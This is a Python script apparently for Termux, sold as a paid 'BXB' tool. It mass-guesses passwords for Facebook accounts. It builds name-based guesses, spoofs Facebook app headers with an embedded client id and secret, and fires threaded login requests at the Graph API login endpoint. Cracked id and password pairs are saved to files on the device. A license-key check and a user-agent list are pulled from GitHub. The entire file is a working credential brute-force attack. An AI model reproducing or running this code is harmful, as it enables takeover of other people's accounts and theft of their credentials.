#coding=utf-8
try: 
    import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct,subprocess
    from string import * 
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python BXB.py') 
try: 
    os.mkdir('/sdcard/ids') 
except:
    pass 
H = '\033[1;32m'
M = '\033[1;37m'
P = '\033[1;37m'
if not os.path.isfile('.andr.txt'):
    print('\n\n\n \033[1;32mGetting credentials ... \033[0;97m')
    os.system('curl -L https://raw.githubusercontent.com/BALOOXH-BRAND/BXB/main/Usera.txt > .andr.txt')
    os.system('clear')
uagents=open('.andr.txt').read().splitlines()



logo="""
\033[1;97m#########   ##         ## #########
\033[1;97m##        ## ##       ## ##        ##
\033[1;97m##        ##  ##     ##  ##        ##
\033[1;97m##        ##   ##   ##   ##        ##
\033[1;97m##########      ## ##    ##########
\033[1;97m##        ##    # ##     ##        ##
\033[1;97m##        ##   ##   ##   ##        ##
\033[1;97m##        ##  ##     ##  ##        ##
\033[1;97m##########  ##         ## ##########
------------------------------------
[+] Author   : Javed Iqbal sad boy
[+] Facebook : Javed Iqbal sad boy
[+] Fb group : Termux Command (BXB)
[+] Version  : 0.3.4
------------------------------------"""
loop = 0
ok = []
methods = []
total=[]
android_models = []

def main():
    try:
        uid=os.getuid()#auto key garnet by termux uid
        xx = ('libsooney.so')
        try:
            key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','r').read()
        except:
            keysv=uuid.uuid4().hex[:5].upper()#Auto Key Grante By uuid
            key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','w').write(keysv)
        kk = ('github')
        k1 = ('XD-007')
        k2 = ('xvp')
        k3 = ('Token.txt')
        key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','r').read()
        key=(f'BXB-H{uid}5X{key1}110E==')#full key
        mysite= requests.get(f'https://raw.githubusercontent.com/DawaR-XD/check/main/Ap.txt').text#approve site
        if key in mysite:
                os.system('clear')
                print(logo)
                print(f'{H}[+] checking security...{P}');time.sleep(2)
                print(
                """
--------------------------------------------
[1] clone file
[2] create file [updated]
[0] exit-program
--------------------------------------------
                """)
                key = input("[+] Choose : ")
                if key in [""]:
                    print("(×) Please Select Correct Option")
                    exit()
                elif key in ["1","01"]:
                    method_crack()
                elif key in ["2","02"]:
                    os.system("python dump.py")
                elif key in ["0","00","E","e"]:
                    exit('\033[1;32m[>] Thank You ')
                else:
                    print('[×] Choose Correct Option');time.sleep(1)
        else:
                os.system ('clear')
                print(logo)
                print(f'{M}[BXB] Your Key Not Registerd...{P}')
               
                print(f'{M}[BXB] This Tools Only For Paid Users [•] Free Users Saty A Way')
                
                print(f'{H}[BXB] Your Key : '+key)
                
                input(f'{M}[BXB] Press Enter For Approve ')    
                whatsapp = "+923497587076"
                url_wa = "https://api.whatsapp.com/send?phone="+whatsapp+"&text="
                tks = ("Hello Javed Sir, I Need To Buy Your Paid Tools Please Approve My Key :)\n\n Key :- "+key)
                subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                
                print(f'run : {H} python BXB.py');pass
    except ValueError:
        print('');pass
        
def method_crack():
    try:
        uid=os.getuid()#auto key garnet by termux uid
        xx = ('libsooney.so')
        try:
            key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','r').read()
        except:
            keysv=uuid.uuid4().hex[:5].upper()#Auto Key Grante By uuid
            key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','w').write(keysv)
        kk = ('github')
        k1 = ('XD-007')
        k2 = ('xvp')
        k3 = ('Token.txt')
        key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','r').read()
        key=(f'BXB-H{uid}5X{key1}110E==')#full key
        mysite= requests.get(f'https://raw.githubusercontent.com/DawaR-XD/check/main/Ap.txt').text#approve site
        if key in mysite:
                os.system('clear')
                print(logo)
                print(f'{H}[+] checking security...{P}');time.sleep(2)
                print(
                """
--------------------------------------------
[1] method 1
[2] method 2
[0] exit-program
--------------------------------------------
                """)
                key = input("[+] Choose : ")
                if key in [""]:
                    print("(×) Please Select Correct Option")
                    exit()
                elif key in ["1","01"]:
                    methods.append('m1')
                    os.system('clear')
                    print(logo)
                    crack_main().crack(id)
                elif key in ["2","02"]:
                    methods.append('m2')
                    os.system('clear')
                    print(logo)
                    crack_main().crack(id)
                elif key in ["0","00","E","e"]:
                    exit('\033[1;32m[>] Thank You ')
                else:
                    print('[×] Choose Correct Option');time.sleep(1)
        else:
                os.system ('clear')
                print(logo)
                print(f'{M}[BXB] Your Key Not Registerd...{P}')
               
                print(f'{M}[BXB] This Tools Only For Paid Users \n{U}[•] Free Users Saty A Way')
                
                print(f'{H}[BXB] Your Key : '+key)
                
                input(f'{M}[BXB] Press Enter For Approve ')    
                whatsapp = "+923497587076"
                url_wa = "https://api.whatsapp.com/send?phone="+whatsapp+"&text="
                tks = ("Hello Javed Sir, I Need To Buy Your Paid Tools Please Approve My Key :)\n\n Key :- "+key)
                subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                
                print(f'run : {H} python BXB.py');pass
    except ValueError:
        print('');pass
        

class crack_main():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        os.system('clear')
        print(logo)
        self.file = input(' Put file path: ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(' No file found ....')
            exit()
    def m1(self,iid,name,passlist):
        try:
            global ok,loop,android_models
            sys.stdout.write('\r%s |method: 1|OK:%s \r'%(loop,len(ok)));sys.stdout.flush()
            fn = name.split(' ')[0]
            try:
                ln = name.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                uasera = random.choice(uagents)
                client_id = '6628568379'
                client_secrets = 'c1e620fa708a1d5696fb991c1bde5662'
                version = str(random.randrange(8,15))
                osv = str(random.randrange(1,9))
                abv = ['A','B','C']
                
                if '8' in version:
                    ipsw = '12'+random.choice(abv)+str(random.randint(11,99))
                elif '9' in version:
                    ipsw = '13'+random.choice(abv)+str(random.randint(11,99))
                elif '10' in version:
                    ipsw = '14'+random.choice(abv)+str(random.randint(11,99))
                elif '11' in version:
                    ipsw = '15'+random.choice(abv)+str(random.randint(11,99))
                elif '12' in version:
                    ipsw = '16'+random.choice(abv)+str(random.randint(11,99))
                elif '13' in version:
                    ipsw = '17'+random.choice(abv)+str(random.randint(11,99))
                elif '14' in version:
                    ipsw = '18'+random.choice(abv)+str(random.randint(11,99))
                elif '15' in version:
                    ipsw = '19'+random.choice(abv)+str(random.randint(11,99))
                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
                application_version_code=str(random.randint(000000000,999999999))
                ua_ios = 'Mozilla/5.0 (iPhone, CPU iPhone '+version+'_'+osv+' like Mac OS '+version+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+ipsw+' [FBAN/FBIOS;FBAV/'+application_version+';FBBV/'+application_version_code+';FBDV/'+version+'.'+osv+';FBMD/iPhone;FBSN/iOS;FBSV/'+version+'.'+osv+';FBSS/2;FBCR/Reliance JIO;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS;]'
                adid = str(uuid.uuid4())
                device_id = str(uuid.uuid4())
                li = ['28','29','210']
                li2 = random.choice(li)
                usera = random.choice(uagents)
                j1 = ''.join(random.choice(digits) for _ in range(2))
                j2 = li2+j1
                data = {
                    'adid':adid,
                    'format':'json',
                    'api_key':client_id,
                    'community_id':'',
                    'device_id':device_id,
                    'family_device_id':device_id,
                    'fb_api_caller_class':'com.facebook.katana.server.handler.Fb4aAuthHandler',
                    'fb_api_caller_class':'com.facebook.registration.protocol.RegisterAccountMethod',
                    'fb_api_caller_class':'com.facebook.auth.login.AuthOperations',
                    'currently_logged_in_userid':'0',
                    'try_num':'1',
                    'email':iid,
                    'password':pas,
                    'jazoest':j2,
                    'generate_analytics_claim':'1',
                    'cpl':'true',
                    'generate_session_cookies':'1',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'auth.login',
                    'locale':'en_US',
                    'locale':'en_PK',
                    'client_country_code':'US',
                    'advertising_id':adid,
                    'meta_inf_fbmeta':'NO_FILE',
                    'access_token':f'{client_id}|{client_secrets}'
                }
                head = {
                    'Authorization':f'OAuth {client_id}|{client_secrets}',
                    'X-FB-Connection-Quality':'EXCELLENT',
                    'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                    'x-fb-net-hni':str(random.randint(2e4,4e4)),
                    'x-fb-connection-bandwidth':str(random.randint(3e7,4e7)),
                    'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
                    'x-fb-friendly_name':'authenticate',
                    'content-encoding':'application/x-www-form-urlencoded',
                    'x-tigon-is_retry':'true',
                    'x-fb-http-engine':'Liger',
                    'x-requested-with':'com.facebook.katana',
                    'connection':'close',
                    'user-agent':usera
                }
                url = 'https://graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true)'
                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                q = json.loads(po)
                if 'session_key' in q:
                    print(' \033[1;32m [BXB-OK] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/ids/ok.txt','a').write(iid+'|'+pas+'\n')
                    ok.append(iid)
                    break
                elif 'two_factor' in q:
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(' \033[1;31m [BXB-CP] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/ids/cp.txt','a').write(iid+'|'+pas+'\n')
                else:
                    continue
            loop+=1
        except Exception as e:
            pass
    def m2(self,iid,name,passlist):
        try:
            global ok,loop,android_models
            sys.stdout.write('\r%s |method: 2|OK:%s \r'%(loop,len(ok)));sys.stdout.flush()
            fn = name.split(' ')[0]
            try:
                ln = name.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                usera = random.choice(uagents)
                client_id = '6628568379'
                client_secrets = 'c1e620fa708a1d5696fb991c1bde5662'
                version = str(random.randrange(8,15))
                osv = str(random.randrange(1,9))
                abv = ['A','B','C']
                
                if '8' in version:
                    ipsw = '12'+random.choice(abv)+str(random.randint(11,99))
                elif '9' in version:
                    ipsw = '13'+random.choice(abv)+str(random.randint(11,99))
                elif '10' in version:
                    ipsw = '14'+random.choice(abv)+str(random.randint(11,99))
                elif '11' in version:
                    ipsw = '15'+random.choice(abv)+str(random.randint(11,99))
                elif '12' in version:
                    ipsw = '16'+random.choice(abv)+str(random.randint(11,99))
                elif '13' in version:
                    ipsw = '17'+random.choice(abv)+str(random.randint(11,99))
                elif '14' in version:
                    ipsw = '18'+random.choice(abv)+str(random.randint(11,99))
                elif '15' in version:
                    ipsw = '19'+random.choice(abv)+str(random.randint(11,99))
                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
                application_version_code=str(random.randint(000000000,999999999))
                ua_ios = 'Mozilla/5.0 (iPhone, CPU iPhone '+version+'_'+osv+' like Mac OS '+version+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+ipsw+' [FBAN/FBIOS;FBAV/'+application_version+';FBBV/'+application_version_code+';FBDV/'+version+'.'+osv+';FBMD/iPhone;FBSN/iOS;FBSV/'+version+'.'+osv+';FBSS/2;FBCR/Reliance JIO;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS;]'
                adid = str(uuid.uuid4())
                device_id = str(uuid.uuid4())
                li = ['28','29','210']
                li2 = random.choice(li)
                j1 = ''.join(random.choice(digits) for _ in range(2))
                j2 = li2+j1

                data = {
                    'adid':adid,
                    'format':'json',
                    'api_key':client_id,
                    'community_id':'',
                    'device_id':device_id,
                    'fb_api_caller_class':'com.facebook.katana.server.handler.Fb4aAuthHandler',
                    'fb_api_caller_class':'com.facebook.registration.protocol.RegisterAccountMethod',
                    'fb_api_caller_class':'com.facebook.auth.login.AuthOperations',
                    'family_device_id':device_id,
                    'currently_logged_in_userid':'0',
                    'try_num':'1',
                    'email':iid,
                    'password':pas,
                    'jazoest':j2,
                    'generate_analytics_claim':'1',
                    'cpl':'true',
                    'generate_session_cookies':'1',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'auth.login',
                    'locale':'en_US',
                    'locale':'en_PK',
                    'client_country_code':'US',
                    'advertising_id':adid,
                    'meta_inf_fbmeta':'NO_FILE',
                    'access_token':f'{client_id}|{client_secrets}'
                }
                head = {
                    'Authorization':f'OAuth {client_id}|{client_secrets}',
                    'X-FB-Connection-Quality':'EXCELLENT',
                    'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                    'x-fb-net-hni':str(random.randint(2e4,4e4)),
                    'x-fb-connection-bandwidth':str(random.randint(3e7,4e7)),
                    'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
                    'x-fb-friendly_name':'authenticate',
                    'fb_api_req_friendly_name':'authLogin',
                    'content-encoding':'application/x-www-form-urlencoded',
                    'x-tigon-is_retry':'true',
                    'x-fb-http-engine':'Liger',
                    'x-requested-with':'com.facebook.katana',
                    'connection':'close',
                    'user-agent':usera
                }
                url = 'https://graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true)'
                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                q = json.loads(po)
                if 'session_key' in q:
                    print(' \033[1;32m [BXB-OK] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/ids/ok.txt','a').write(iid+'|'+pas+'\n')
                    ok.append(iid)
                    break
                elif 'two_factor' in q:
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(' \033[1;31m [BXB-CP] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/ids/cp.txt','a').write(iid+'|'+pas+'\n')
                else:
                    continue
            loop+=1
        except Exception as e:
            pass
    def pasw(self):
        passlist = []
        os.system('clear')
        print(logo)
        print('\033[1;36m Put limit between 1 to 8\033[0;97m')
        pl = int(input(' How many password do you want to add ? '))
        print('\n\033[1;35m Password example: first123,first12345,firs786,firstlast, First last etc \033[0;97m')
        print('')
        if pl =='':
            print('\n Put limit between 1 to 8')
            time.sleep(1)
            passw(self)
        elif pl > 8:
            print('\ Password limit should not be greater than 8')
            time.sleep(1)
            passw(self)
        else:
            for cd in range(pl):
                passlist.append(input(f' Put password no {cd+1}: '))
        os.system('clear')
        print(logo)
        print('------------------------------------')
        print('Total id: '+str(len(self.id)))
        print('The process started...')
        print('------------------------------------')
        with ThreadPool(max_workers=30) as formSubmit:
            for user in self.id:
                iid,name = user.split('|')
                if 'm1' in methods:
                    formSubmit.submit(self.m1,iid,name,passlist)
                elif 'm2' in methods:
                    formSubmit.submit(self.m2,iid,name,passlist)
                elif 'm3' in methods:
                    formSubmit.submit(self.m3,iid,name.passlist)
                else:
                    print(' Internal script error, please contact to author')
                    exit()
        print(50*'-')
        print(' The process has been completed')
        print(' Total OK: '+str(len(ok)))
        input('\n Press enter to back ')
        os.system('python BXB.py')

main()
